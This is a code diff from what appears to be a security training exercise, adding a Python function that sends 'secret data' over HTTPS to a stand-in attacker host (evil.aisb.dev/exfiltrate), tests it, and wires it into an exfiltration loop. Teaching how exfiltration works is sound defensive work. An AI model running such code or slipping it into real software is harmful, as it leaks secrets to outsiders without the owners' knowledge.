@@ -63,3 +63,34 @@ if __name__ == "__main__":  # Only executed when running the script directly
 
     thread = threading.Thread(target=loop_exfiltration)
     thread.start()
+
+# %%
+def make_evil_request_https(secret_data: str) -> Optional[str]:
+    """
+    Send a GET request over HTTPS to evil.aisb.dev with secret data.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails
+    """
+    # TODO: Implement the function to:
+    #   1. Make a GET request to https://evil.aisb.dev/exfiltrate?data=secret_data
+    #   2. Return the response text if successful (status 200), None otherwise
+    try:
+        resp = requests.get("https://evil.aisb.dev/exfiltrate", params={"data": secret_data}, timeout=5)
+        if resp.status_code != 200:
+            return None
+        return resp.text
+    except Exception as inst:
+        print(inst)
+        return None
+from w1d2_test import test_make_evil_request_https
+test_make_evil_request_https(make_evil_request_https)
+
+
+# Update the exfiltrate_data function to use HTTPS
+exfiltrate_data = make_evil_request_https
+
+# %%
